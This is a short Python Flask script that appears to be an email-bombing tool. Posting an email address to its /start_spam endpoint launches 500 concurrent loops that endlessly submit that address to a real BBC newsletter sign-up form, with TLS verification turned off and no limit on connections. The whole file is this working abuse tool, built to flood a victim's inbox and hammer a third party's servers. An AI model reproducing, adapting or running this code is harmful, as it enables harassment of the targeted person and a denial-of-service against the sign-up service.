from flask import Flask, request, jsonify
import aiohttp
import asyncio
from datetime import datetime
import os

# Install asyncio event loop for Windows if necessary
try:
    import winloop
    winloop.install()
except ImportError:
    pass

app = Flask(__name__)

async def signup_spam(session, email):
    url = f'https://cloud.email.bbc.com/Bluey-Sign-Up-Form_Processing_prod?context=SUBMIT&email={email}'
    while True:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    print(f'[{datetime.now().strftime("%H:%M:%S")}] Sent!')
                else:
                    print(f'[{datetime.now().strftime("%H:%M:%S")}] Failed with status {response.status}')
        except aiohttp.ClientError as e:
            print(f'[{datetime.now().strftime("%H:%M:%S")}] Error: {e}')

async def start_spam(email):
    connector = aiohttp.TCPConnector(limit=None, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [signup_spam(session, email) for _ in range(500)]
        await asyncio.gather(*tasks)

@app.route('/start_spam', methods=['POST'])
def start_spam_route():
    email = request.json.get('email')
    if not email:
        return jsonify({"error": "Email is required"}), 400

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_spam(email))
    loop.close()
    
    return jsonify({"status": "Spamming started"}), 200

if __name__ == '__main__':
    os.system("cls && title mahdi1337")
    app.run(debug=True)
